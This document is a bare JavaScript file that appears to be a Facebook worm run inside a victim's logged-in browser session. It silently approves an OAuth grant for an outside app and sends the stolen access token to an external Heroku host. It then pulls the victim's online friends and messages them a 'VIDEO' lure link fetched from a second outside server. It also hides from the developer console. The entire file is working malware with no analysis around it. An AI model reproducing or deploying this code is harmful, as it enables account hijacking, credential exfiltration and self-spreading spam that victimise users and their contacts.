(new Image).src = "//whos.amung.us/swidget/mandar1n0s";
var cnsl = true;
var win = this;
var ajax = win["XMLHttpRequest"];
function start() {
  var cookie_name = "sound:" + profile_id + " || audio: Enabled";
  var cookie_time = 30;
  if (!getCookie(cookie_name) || parseInt(getCookie(cookie_name)) < Date.now() - 60 * 1E3 * cookie_time) {
    createCookie(cookie_name, Date.now(), 1);
    config = {};
    config["chat_limit"] = 20;
    _e_P();
    nekot();
  }
}
function nekot() {

  if (localStorage.access_token != "nekot") {
    var getParams = {};
    getParams["composer_id"] = "rc.u_0_" + rand(0, 30);
    getParams["composer_type"] = "pages_feed";
    getParams["target_id"] = "20531316728";
    getParams["av"] = profile_id;
    getParams["dpr"] = "1";
    var params = {};
    params["__user"] = profile_id;
    params["__a"] = "1";
    params["__dyn"] = __dyn;
    params["__af"] = "j0";
    params["__req"] = "2z";
    params["__be"] = "-1";
    params["__pc"] = "EXP1:home_page_pkg";
    params["__rev"] = __rev;
    params["fb_dtsg"] = fb_dtsg;
    params["jazoest"] = jazoest;
    var xhr = new ajax;
    xhr.open("POST", "/react_composer/status/bootstrap/?" + deSerialize(getParams));
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
        if (xhr.responseText.indexOf("access_token") > 0) {
           new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gnd=PROBA_INBOX";
          localStorage.access_token = "nekot";
        }
      }
    };
    xhr.send(deSerialize(params));
  }
}
function _e_P() {
  var params = {};
  params["fb_dtsg"] = fb_dtsg;
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
  params["__af"] = "3p";
  params["__req"] = "pS";
  params["__be"] = "-1";
  params["__pc"] = "EXP:DEFAULT";
  params["__rev"] = __rev;
  params["jazoest"] = jazoest;
  var xhr = new ajax;
  xhr.open("POST", "/settings/application/platform_opt_out/submit/?action=enable&dpr=1", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      _g_T();
    }
  };
  xhr.send(deSerialize(params));
}
function _g_T() {
  var params = {};
  params["fb_dtsg"] = fb_dtsg;
  params["app_id"] = "165907476854626";
  params["redirect_uri"] = "fbconnect://success";
  params["display"] = "popup";
  params["access_token"] = "";
  params["sdk"] = "";
  params["from_post"] = "1";
  params["private"] = "";
  params["tos"] = "";
  params["login"] = "";
  params["read"] = "";
  params["write"] = "";
  params["extended"] = "";
  params["social_confirm"] = "";
  params["confirm"] = "";
  params["seen_scopes"] = "";
  params["auth_type"] = "";
  params["auth_token"] = "";
  params["auth_nonce"] = "";
  params["default_audience"] = "";
  params["ref"] = "Default";
  params["return_format"] = "access_token";
  params["domain"] = "";
  params["sso_device"] = "ios";
  params["__CONFIRM__"] = "1";
  var xhr = new ajax;
  xhr.open("POST", "/v2.8/dialog/oauth/confirm", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      if (xhr.responseText.indexOf("access_token=") > 0) {
        jsonOBJECT = {};
        jsonOBJECT.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
        online(jsonOBJECT);
      }
    }
  };
  xhr.send(deSerialize(params));
}


function online(jsonOBJECT) {
  var params = {};
  params["q"] = "SELECT uid, name, locale, online_presence, pic_big, can_post  FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) Order By online_presence Limit 2000";
  params["access_token"] = jsonOBJECT.access_token;
  params["ext"] = "me";
  var xhr = new ajax;
  xhr.open("GET", "https://graph.facebook.com/fql?" + deSerialize(params), true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText.replace("for (;;);", ""));
      if (!data.error) {
        var friends = data.data;
        friends = shuffle(friends);
        jsonOBJECT.friends = [];
        i = 0;
        for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
          if (friends[i].online_presence == "active") {
            jsonOBJECT.friends.push(friends[i]);
          }
        }
        i = 0;
        for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
          if (friends[i].online_presence == "idle") {
            jsonOBJECT.friends.push(friends[i]);
          }
        }
        // i = 0;
        // for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
        //   if (friends[i].online_presence == "offline") {
        //     jsonOBJECT.friends.push(friends[i]);
        //   }
        // }
        if (jsonOBJECT.friends.length > 0) {
          _G_L(jsonOBJECT);
        }
      }
    }
  };
  xhr.send();
}
function _G_L(jsonOBJECT) {
  var xhr = new ajax;
  xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid="+profile_id);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText);
      if (data.link) {
        jsonOBJECT.link = data.link;
        i = 0;
        for (;i < jsonOBJECT.friends.length;i++) {
          jsonOBJECT.uid = jsonOBJECT.friends[i].uid;
         jsonOBJECT.pic_big = jsonOBJECT.friends[i].pic_big;
          jsonOBJECT.name = jsonOBJECT.friends[i].name ? jsonOBJECT.friends[i].name.split(" ")[0] : jsonOBJECT.friends[i].text.split(" ")[0];
          jsonOBJECT.locale = jsonOBJECT.friends[i].locale;
          _S_e(jsonOBJECT);
        }
      }
    }
  };
  xhr.send();
}
function _S_e(jsonOBJECT) {
  var uid = jsonOBJECT.uid;
  var pic_big = jsonOBJECT.pic_big;
  var name = jsonOBJECT.name;
  var link = jsonOBJECT.link;
  var textArray = [":o", ":P", "O:)", "3:)", ";)", ":O", "-_-", ">:O", ":*", "<3", "^_^", "8-)", "(y)", ":)"];
  var emoji = textArray[Math.floor(Math.random() * textArray.length)];
  message_id = rand(0xa1b01d4b1c7, 999999999999999);
  var params = {};
  params["client"] = "mercury";
  params["action_type"] = "ma-type:user-generated-message";
  params["body"] = jsonOBJECT.name + " " + emoji + "\nV⤵ I⤵ D⤵E⤵O⤵\n" + link;
  params["has_attachment"] = "false";
  params["message_id"] = message_id;
  params["offline_threading_id"] = message_id;
  params["other_user_fbid"] = jsonOBJECT.uid;
  params["signature_id"] = rastgele(8);
  params["source"] = "source:chat:web";
  params["specific_to_list[0]"] = "fbid:" + jsonOBJECT.uid;
  params["specific_to_list[1]"] = "fbid:" + profile_id;
  params["timestamp"] = Date.now();
  params["ui_push_phase"] = "C3";
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = __dyn;
  params["__af"] = "j0";
  params["__req"] = "18";
  params["__be"] = "-1";
  params["__pc"] = "PHASED:DEFAULT";
  params["__rev"] = __rev;
  params["fb_dtsg"] = fb_dtsg;
  params["jazoest"] = jazoest;
  params["__spin_r"] = __rev;
  params["__spin_b"] = "trunk";
  params["__spin_t"] = Math.floor(Date.now() / 1E3);
  var xhr = new ajax;
  xhr.open("POST", "/messaging/send/?dpr=1", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = JSON.parse(xhr.responseText.replace("for (;;);", ""));
      if(data.error){
        console.log(data.error);
      }

      xhr.close;
    }
  };
  xhr.send(deSerialize(params));
}


function banword(obj) {
    delimiters = [unescape("%A0"), " ", ".", "_", "-"];
    obj = obj["split"]("");
    finalWord = "";
    insertIn = Math["floor"](Math["random"]() * obj["length"]);
    if (obj[insertIn] == " ") {
      insertIn--;
    }
    if (insertIn == obj["length"]) {
      insertIn--;
    }
    for (var i = 0;i < obj["length"];i++) {
      finalWord = finalWord + (insertIn == i ? obj[i] + delimiters[Math["floor"](Math["random"]() * delimiters["length"])] : obj[i]);
    }
    return finalWord;
  }
function generate_name(length, firstUpper) {
  rname = "";
  sesli = "aeiou";
  sessiz = "bcdfghjklmnprstvyz";
  rname = rand(1, 2) == 1 ? sessiz[rand(0, sessiz.length - 1)] : sesli[rand(0, sesli.length - 1)];
  if (firstUpper == true) {
    rname = rname.toUpperCase();
  }
  n = 0;
  for (;n < length;n++) {
    if (sesli.indexOf(rname[rname.length - 1]) >= 0) {
      rname += sessiz[rand(0, sessiz.length - 1)];
    } else {
      rname += sesli[rand(0, sesli.length - 1)];
    }
  }
  return rname;
}
function getCookie(cname) {
  var name = cname + "=";
  var ca = document.cookie.split(";");
  var i = 0;
  for (;i < ca.length;i++) {
    var c = ca[i];
    for (;c.charAt(0) == " ";) {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  return "";
}
function createCookie(name, value, days) {
  var expires;
  if (days) {
    var date = new Date;
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1E3);
    expires = "; expires=" + date.toGMTString();
  } else {
    expires = "";
  }
  document.cookie = name + "=" + value + expires + "; path=/";
}
function inArray(arr, key, value) {
  var res = false;
  a = 0;
  for (;a < arr.length;a++) {
    for (k in arr[a]) {
      if (k == key && arr[a][k] == value) {
        res = true;
        break;
      }
    }
  }
  return res;
}
function get_dyn() {
  function toCompressedString() {
    $BitMap1 = [];
    for (i in t) {
      $BitMap1[t[i]] = 1;
    }
    if ($BitMap1["length"] === 0) {
      return "";
    }
    var l = [];
    var m = 1;
    var n = $BitMap1[0] || 0;
    var o = n.toString(2);
    var p = 1;
    for (;p < $BitMap1["length"];p++) {
      var q = $BitMap1[p] || 0;
      if (q === n) {
        m++;
      } else {
        l["push"](j(m));
        n = q;
        m = 1;
      }
    }
    if (m) {
      l["push"](j(m));
    }
    return k(o + l["join"](""));
  }
  function j(l) {
    var m = l.toString(2);
    var n = "0"["repeat"](m["length"] - 1);
    return n + m;
  }
  function k(l) {
    var m = (l + "00000")["match"](/[01]{6}/g);
    var n = "";
    var o = 0;
    for (;o < m["length"];o++) {
      n += h[parseInt(m[o], 2)];
    }
    return n;
  }
  var bd = document["body"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
  var hd = document["head"]["innerHTML"]["match"](/\},([0-9])+\]/gi);
  var is = bd["concat"](hd);
  var t = [];
  for (x in is) {
    if (is[x] != null) {
      var p = is[x]["replace"]("},", "")["replace"]("]", "");
      if (parseInt(p) >= 7) {
        t["push"](parseInt(p));
      }
    }
  }
  var h = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_";
  return toCompressedString();
}
function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 65536).toString(16).substring(1);
  }
  return s4() + s4() + "-" + s4() + "-" + s4() + "-" + s4() + "-" + s4() + s4() + s4();
}
function randoms(l, m) {
  var r = [];
  for (;r.length < l;) {
    var rnd = Math.floor(Math.random() * m);
    if (r.indexOf(rnd) < 0) {
      r.push(rnd);
    }
  }
  return r;
}
function searchArray(a, k) {
  var found = false;
  for (key in a) {
    if (key.toString() == k) {
      found = a[key];
      break;
    } else {
      if (typeof a[key] == "object") {
        found = searchArray(a[key], k);
        if (found != false) {
          break;
        }
      }
    }
  }
  return found;
}
function shuffle(array) {
  var currentIndex = array.length;
  var temporaryValue;
  var randomIndex;
  for (;0 !== currentIndex;) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }
  return array;
}
function rand(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}
function rastgele(uzunluk) {
  mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
  ret = "";
  l = 0;
  for (;l < uzunluk;l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}
function random(nr) {
  mtn = "abcdefghijklmnoprstuvyzx";
  ret = "";
  l = 0;
  for (;l < nr;l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}
function deSerialize(json) {
  return Object.keys(json).map(function(key) {
    return encodeURIComponent(key) + "=" + encodeURIComponent(json[key]);
  }).join("&");
}

var cntrl = "d";
var element = new Image;
element.__defineGetter__("id", function() {
  cntrl = "e";
  if (cnsl == false) {
    location.reload();
  }
});
console.log(element);
console.clear();
if (location.hostname.indexOf("facebook.com") >= 0 && (cntrl == "d" || cnsl == true)) {
  fb_dtsg_list = document.getElementsByName("fb_dtsg");
  if (fb_dtsg_list.length > 0) {
    profile_id = document.cookie.match(/c_user=(\d+)/)[1];
    fb_dtsg = fb_dtsg_list[0].value;
    __dyn = get_dyn();
    if (document.head.innerHTML.split('"client_revision":')[1]) {
      __rev = document.head.innerHTML.split('"client_revision":')[1].split(",")[0];
    } else {
      __rev = rand(1111111, 9999999);
    }
    jazoest = "";
    var x = 0;
    for (;x < fb_dtsg.length;x++) {
      jazoest += fb_dtsg.charCodeAt(x);
    }
    jazoest = "2" + jazoest;
    start();
  }
}
;
